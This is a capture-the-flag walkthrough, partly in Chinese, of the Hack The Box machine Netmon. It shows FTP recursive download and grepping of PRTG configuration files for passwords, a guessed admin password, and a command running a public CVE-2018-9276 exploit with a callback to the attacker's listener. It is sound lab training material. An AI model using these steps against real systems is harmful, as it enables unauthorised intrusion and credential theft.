# Netmon
- URL : https://app.hackthebox.eu/machines/Netmon
- IP : 10.129.210.193

# Recon
- Rustscan
    ```Open 10.129.210.193:21
    Open 10.129.210.193:80
    Open 10.129.210.193:135
    Open 10.129.210.193:139
    Open 10.129.210.193:445
    Open 10.129.210.193:5985
    ```
- nmap 
    - ![](https://i.imgur.com/u3hdM2g.png)
    - ![](https://i.imgur.com/T90oc8o.png)

- FTP
    - ![](https://i.imgur.com/9s6meyF.png)
    - ![](https://i.imgur.com/8q3qqmk.png)
- Web
    - appVersion':'18.1.37.13946'
    - ![](https://i.imgur.com/F8Bbaii.png)
    - https://github.com/wildkindcc/CVE-2018-9276
    - https://github.com/chcx/PRTG-Network-Monitor-RCE

## FTP
- ![](https://i.imgur.com/D82BbiD.png)
- ![](https://i.imgur.com/DXZXqWq.png)
- Try Exploit
    - https://github.com/chcx/PRTG-Network-Monitor-RCE
    - ![](https://i.imgur.com/JXCuntx.png)
    - 需要登入才能用，所以我們需要找帳密QQ
- 從官網發現 Log 跟 Config 存在 `/ProgramData/Paessler`
    - `wget -r ftp://10.129.210.193/ProgramData/Paessler`
    - 整包載下來
- `grep password */* | less`
    - 發現 `PRTG Configuration.dat` 很可疑
    - ![](https://i.imgur.com/aYorBkq.png)
- 看到相關的檔案有以下幾個
    - `PRTG Configuration.old.bak`
    - `PRTG Configuration.dat`
    - `PRTG Configuration.old`
    - `Configuration Auto-Backups/*`
- `PRTG Configuration.old.bak` 應該最可疑
    - ![](https://i.imgur.com/5ElS4Za.png)
    - 看到帳密 
        - `prtgadmin`
        - `PrTg@dmin2018`
        - 但登入失敗
- 通靈把密碼改 `2019`
    - `prtgadmin`
    - `PrTg@dmin2019`
    - 登入成功
    - ![](https://i.imgur.com/QzgPzeh.png)
## Exploit
- https://github.com/wildkindcc/CVE-2018-9276
    - `python CVE-2018-9276.py -i 10.129.210.202 -p 80 --lhost 10.10.16.35 --lport 7877 --user prtgadmin --password PrTg@dmin2019`
    - ![](https://i.imgur.com/50J42zh.png)
- 確定權限
    - ![](https://i.imgur.com/abehEpS.png)
- 取得 Flag
    - ![](https://i.imgur.com/k4rFH3h.png)

## 學到了
- FTP 記得 ls -al 避免隱藏檔案
- 密碼可以試試看猜規則 QQ
    - 年分之類的